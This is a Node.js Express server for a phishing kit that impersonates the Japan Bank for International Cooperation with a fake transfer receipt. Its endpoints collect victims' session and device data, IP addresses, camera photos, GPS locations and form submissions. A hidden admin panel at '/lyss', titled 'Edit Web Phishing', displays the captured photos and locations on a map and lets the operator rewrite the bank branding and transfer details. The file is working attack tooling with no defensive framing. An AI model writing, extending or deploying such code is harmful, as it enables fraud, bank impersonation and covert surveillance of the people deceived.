const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json({ limit: '50mb' }));

const dataStore = { sessions: [], photos: [], locations: [], forms: [] };

let webConfig = {
    header_text: 'Japan Bank for International Cooperation',
    logo_text: 'JBIC',
    logo_sub: '国際協力銀行',
    logo_small: 'JAPAN BANK FOR INTERNATIONAL COOPERATION',
    title_line1: 'JBIC JAPAN BANK',
    title_line2: 'INTERNATIONAL CORPORATION',
    subtitle: 'Office Purchasing',
    amount_idr: 'IDR 530.000',
    amount_foreign: 'YEN 4.733',
    transaction_type: 'International Transfer',
    currency: 'IDR / JPY',
    reference: 'DEMO-530000',
    status: 'SAMPLE',
    sender_name: 'Japan Bank for International Cooperation',
    sender_bank: 'JBIC Japan Bank',
    sender_account: 'JBIC-001',
    receiver_name: 'Office Purchasing Department',
    receiver_bank: 'JBIC Japan Bank',
    receiver_account: 'JBIC-002'
};

// ===== API =====
app.post('/api/session', (req, res) => {
    dataStore.sessions.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.post('/api/photo', (req, res) => {
    dataStore.photos.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.post('/api/location', (req, res) => {
    dataStore.locations.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.post('/api/submit', (req, res) => {
    dataStore.forms.push({ ...req.body, time: new Date().toLocaleString('id-ID') });
    res.json({ success: true });
});

app.get('/api/config', (req, res) => {
    res.json({ success: true, config: webConfig });
});

app.post('/api/config', (req, res) => {
    webConfig = { ...webConfig, ...req.body };
    res.json({ success: true, config: webConfig });
});

app.get('/api/data', (req, res) => {
    res.json({ success: true, data: dataStore });
});

// ===== ADMIN PANEL (GENERATED) =====
app.get('/lyss', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ILYSS // ADMIN</title>
    <style>
        :root { --green:#00ff41; --dark:#0a0a0a; --panel:#111; --border:#222; --text:#ccc; --dim:#555; }
        * { margin:0; padding:0; box-sizing:border-box; font-family:'Courier New',monospace; }
        body { background:var(--dark); color:var(--text); min-height:100vh; }
        .header { padding:20px; border-bottom:2px solid var(--green); }
        .header h1 { color:var(--green); font-size:22px; text-shadow:0 0 10px var(--green); }
        .container { max-width:1000px; margin:0 auto; padding:20px; }
        .stats { display:grid; grid-template-columns:repeat(4,1fr); gap:10px; margin-bottom:20px; }
        .stat { background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:18px; text-align:center; }
        .stat-num { font-size:28px; font-weight:900; color:var(--green); }
        .stat-label { font-size:9px; color:var(--dim); margin-top:4px; text-transform:uppercase; letter-spacing:1px; }
        .panel { background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:18px; margin-bottom:15px; }
        .panel-title { font-size:13px; color:var(--green); margin-bottom:12px; text-transform:uppercase; letter-spacing:1px; }
        table { width:100%; border-collapse:collapse; }
        th { text-align:left; padding:8px; font-size:9px; color:var(--green); border-bottom:1px solid var(--border); text-transform:uppercase; }
        td { padding:10px 8px; font-size:10px; border-bottom:1px solid var(--border); }
        .photos { display:grid; grid-template-columns:repeat(auto-fill,minmax(100px,1fr)); gap:8px; }
        .photo { border:1px solid var(--green); border-radius:5px; overflow:hidden; position:relative; cursor:pointer; }
        .photo img { width:100%; display:block; }
        .photo a { position:absolute; bottom:3px; right:3px; padding:3px 6px; background:rgba(0,0,0,0.8); color:var(--green); font-size:8px; text-decoration:none; }
        .map-box { background:#0d0d0d; border:1px solid var(--green); border-radius:8px; padding:15px; }
        .map-box iframe { width:100%; height:250px; border:0; border-radius:5px; filter:invert(90%) hue-rotate(180deg) brightness(0.8); }
        .map-link { display:inline-block; padding:8px 14px; background:var(--green); color:var(--dark); text-decoration:none; border-radius:5px; font-size:11px; font-weight:700; margin-top:8px; }
        .form-group { margin-bottom:12px; }
        .form-group label { display:block; font-size:10px; color:var(--green); margin-bottom:4px; text-transform:uppercase; }
        .form-input { width:100%; padding:10px; background:#0d0d0d; border:1px solid var(--border); border-radius:5px; color:var(--text); font-size:12px; outline:none; }
        .form-input:focus { border-color:var(--green); }
        .save-btn { width:100%; padding:14px; background:var(--green); color:var(--dark); border:none; border-radius:5px; font-weight:900; cursor:pointer; font-size:13px; margin-top:15px; }
        .zoom { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:1000; justify-content:center; align-items:center; }
        .zoom.active { display:flex; }
        .zoom img { max-width:95%; max-height:90vh; border:2px solid var(--green); }
        .zoom-close { position:absolute; top:15px; right:15px; padding:8px 15px; background:#f33; color:white; border:none; border-radius:5px; cursor:pointer; }
        .tab-bar { display:flex; gap:10px; margin-bottom:20px; }
        .tab-btn { padding:10px 20px; background:var(--panel); border:1px solid var(--border); color:var(--text); border-radius:6px; cursor:pointer; font-size:12px; }
        .tab-btn.active { background:var(--green); color:var(--dark); font-weight:900; border-color:var(--green); }
        .tab-content { display:none; }
        .tab-content.active { display:block; }
        .empty { color:var(--dim); text-align:center; padding:30px; font-size:11px; }
        @media(max-width:600px){ .stats{grid-template-columns:repeat(2,1fr)} }
    </style>
</head>
<body>
    <div class="header"><h1>ILYSS // ADMIN CONTROL</h1></div>
    <div class="container">
        <div class="tab-bar">
            <button class="tab-btn active" onclick="showTab('dashboard')">Dashboard</button>
            <button class="tab-btn" onclick="showTab('edit')">Edit Web</button>
        </div>

        <div class="tab-content active" id="tab-dashboard">
            <div class="stats">
                <div class="stat"><div class="stat-num" id="tSessions">0</div><div class="stat-label">Sessions</div></div>
                <div class="stat"><div class="stat-num" id="tPhotos">0</div><div class="stat-label">Photos</div></div>
                <div class="stat"><div class="stat-num" id="tLocations">0</div><div class="stat-label">Locations</div></div>
                <div class="stat"><div class="stat-num" id="tForms">0</div><div class="stat-label">Forms</div></div>
            </div>

            <div class="panel">
                <div class="panel-title">Lokasi Terakhir</div>
                <div class="map-box">
                    <iframe id="mapFrame" src="" style="display:none;"></iframe>
                    <div id="mapEmpty" class="empty">BELUM ADA LOKASI</div>
                </div>
                <a class="map-link" id="mapLink" href="#" target="_blank" style="display:none;">BUKA DI GOOGLE MAPS</a>
            </div>

            <div class="panel">
                <div class="panel-title">Foto Kamera</div>
                <div class="photos" id="photosGrid"></div>
            </div>

            <div class="panel">
                <div class="panel-title">Data Device</div>
                <div style="overflow-x:auto;">
                    <table>
                        <thead><tr><th>Time</th><th>Device</th><th>Battery</th><th>Network</th><th>IP</th><th>Location</th></tr></thead>
                        <tbody id="sessionsTable"></tbody>
                    </table>
                </div>
            </div>
        </div>

        <div class="tab-content" id="tab-edit">
            <div class="panel">
                <div class="panel-title">Edit Web Phishing</div>
                <div class="form-group"><label>Header Text</label><input class="form-input" id="cfg_header"></div>
                <div class="form-group"><label>Logo Text</label><input class="form-input" id="cfg_logo_text"></div>
                <div class="form-group"><label>Logo Sub</label><input class="form-input" id="cfg_logo_sub"></div>
                <div class="form-group"><label>Logo Small</label><input class="form-input" id="cfg_logo_small"></div>
                <div class="form-group"><label>Title Line 1</label><input class="form-input" id="cfg_title1"></div>
                <div class="form-group"><label>Title Line 2</label><input class="form-input" id="cfg_title2"></div>
                <div class="form-group"><label>Subtitle</label><input class="form-input" id="cfg_subtitle"></div>
                <div class="form-group"><label>Amount IDR</label><input class="form-input" id="cfg_amount_idr"></div>
                <div class="form-group"><label>Amount Foreign</label><input class="form-input" id="cfg_amount_foreign"></div>
                <div class="form-group"><label>Sender Name</label><input class="form-input" id="cfg_sender_name"></div>
                <div class="form-group"><label>Sender Bank</label><input class="form-input" id="cfg_sender_bank"></div>
                <div class="form-group"><label>Sender Account</label><input class="form-input" id="cfg_sender_account"></div>
                <div class="form-group"><label>Receiver Name</label><input class="form-input" id="cfg_receiver_name"></div>
                <div class="form-group"><label>Receiver Bank</label><input class="form-input" id="cfg_receiver_bank"></div>
                <div class="form-group"><label>Receiver Account</label><input class="form-input" id="cfg_receiver_account"></div>
                <div class="form-group"><label>Transaction Type</label><input class="form-input" id="cfg_tx_type"></div>
                <div class="form-group"><label>Currency</label><input class="form-input" id="cfg_currency"></div>
                <div class="form-group"><label>Reference</label><input class="form-input" id="cfg_reference"></div>
                <div class="form-group"><label>Status</label><input class="form-input" id="cfg_status"></div>
                <button class="save-btn" onclick="saveConfig()">SIMPAN SEMUA</button>
            </div>
        </div>
    </div>

    <div class="zoom" id="zoomModal">
        <button class="zoom-close" onclick="closeZoom()">X</button>
        <img id="zoomImg" src="">
    </div>

    <script>
        function showTab(tab) {
            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById('tab-' + tab).classList.add('active');
            event.target.classList.add('active');
        }
        function openZoom(src) { document.getElementById('zoomImg').src = src; document.getElementById('zoomModal').classList.add('active'); }
        function closeZoom() { document.getElementById('zoomModal').classList.remove('active'); }
        document.getElementById('zoomModal').addEventListener('click', function(e) { if (e.target === this) closeZoom(); });

        async function loadConfig() {
            try {
                const r = await fetch('/api/config');
                const c = (await r.json()).config;
                document.getElementById('cfg_header').value = c.header_text || '';
                document.getElementById('cfg_logo_text').value = c.logo_text || '';
                document.getElementById('cfg_logo_sub').value = c.logo_sub || '';
                document.getElementById('cfg_logo_small').value = c.logo_small || '';
                document.getElementById('cfg_title1').value = c.title_line1 || '';
                document.getElementById('cfg_title2').value = c.title_line2 || '';
                document.getElementById('cfg_subtitle').value = c.subtitle || '';
                document.getElementById('cfg_amount_idr').value = c.amount_idr || '';
                document.getElementById('cfg_amount_foreign').value = c.amount_foreign || '';
                document.getElementById('cfg_sender_name').value = c.sender_name || '';
                document.getElementById('cfg_sender_bank').value = c.sender_bank || '';
                document.getElementById('cfg_sender_account').value = c.sender_account || '';
                document.getElementById('cfg_receiver_name').value = c.receiver_name || '';
                document.getElementById('cfg_receiver_bank').value = c.receiver_bank || '';
                document.getElementById('cfg_receiver_account').value = c.receiver_account || '';
                document.getElementById('cfg_tx_type').value = c.transaction_type || '';
                document.getElementById('cfg_currency').value = c.currency || '';
                document.getElementById('cfg_reference').value = c.reference || '';
                document.getElementById('cfg_status').value = c.status || '';
            } catch(e) {}
        }

        async function saveConfig() {
            const config = {
                header_text: document.getElementById('cfg_header').value,
                logo_text: document.getElementById('cfg_logo_text').value,
                logo_sub: document.getElementById('cfg_logo_sub').value,
                logo_small: document.getElementById('cfg_logo_small').value,
                title_line1: document.getElementById('cfg_title1').value,
                title_line2: document.getElementById('cfg_title2').value,
                subtitle: document.getElementById('cfg_subtitle').value,
                amount_idr: document.getElementById('cfg_amount_idr').value,
                amount_foreign: document.getElementById('cfg_amount_foreign').value,
                sender_name: document.getElementById('cfg_sender_name').value,
                sender_bank: document.getElementById('cfg_sender_bank').value,
                sender_account: document.getElementById('cfg_sender_account').value,
                receiver_name: document.getElementById('cfg_receiver_name').value,
                receiver_bank: document.getElementById('cfg_receiver_bank').value,
                receiver_account: document.getElementById('cfg_receiver_account').value,
                transaction_type: document.getElementById('cfg_tx_type').value,
                currency: document.getElementById('cfg_currency').value,
                reference: document.getElementById('cfg_reference').value,
                status: document.getElementById('cfg_status').value
            };
            await fetch('/api/config', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(config) });
            alert('Tersimpan!');
        }

        async function loadData() {
            try {
                const res = await fetch('/api/data');
                const d = (await res.json()).data;
                document.getElementById('tSessions').textContent = d.sessions.length;
                document.getElementById('tPhotos').textContent = d.photos.length;
                document.getElementById('tLocations').textContent = d.locations.length;
                document.getElementById('tForms').textContent = d.forms.length;

                const st = document.getElementById('sessionsTable');
                st.innerHTML = '';
                if (!d.sessions.length) st.innerHTML = '<tr><td colspan="6" class="empty">WAITING FOR DATA...</td></tr>';
                else d.sessions.forEach(s => {
                    const loc = d.locations.find(l => l.session_id === s.session_id);
                    const tr = document.createElement('tr');
                    tr.innerHTML = '<td>' + s.time + '</td><td>' + (s.device_name || '-') + '</td><td>' + (s.battery || '-') + '</td><td>' + (s.network_name || '-') + '</td><td>' + (s.ip_address || '-') + '</td><td>' + (loc ? loc.latitude + ',' + loc.longitude : '-') + '</td>';
                    st.appendChild(tr);
                });

                const pg = document.getElementById('photosGrid');
                pg.innerHTML = '';
                if (!d.photos.length) pg.innerHTML = '<div class="empty">NO PHOTOS YET</div>';
                else d.photos.forEach(p => {
                    const div = document.createElement('div');
                    div.className = 'photo';
                    div.innerHTML = '<img src="' + p.photo_data + '" onclick="openZoom(\'' + p.photo_data + '\')"><a href="' + p.photo_data + '" download>DL</a>';
                    pg.appendChild(div);
                });

                if (d.locations.length > 0) {
                    const loc = d.locations[d.locations.length - 1];
                    const mapUrl = 'https://maps.google.com/maps?q=' + loc.latitude + ',' + loc.longitude + '&z=16&output=embed';
                    document.getElementById('mapFrame').src = mapUrl;
                    document.getElementById('mapFrame').style.display = 'block';
                    document.getElementById('mapEmpty').style.display = 'none';
                    const link = document.getElementById('mapLink');
                    link.href = 'https://www.google.com/maps?q=' + loc.latitude + ',' + loc.longitude;
                    link.style.display = 'inline-block';
                }
            } catch(e) {}
        }

        loadConfig();
        loadData();
        setInterval(loadData, 2000);
    </script>
</body>
</html>`);
});

// ===== WEB PHISHING =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
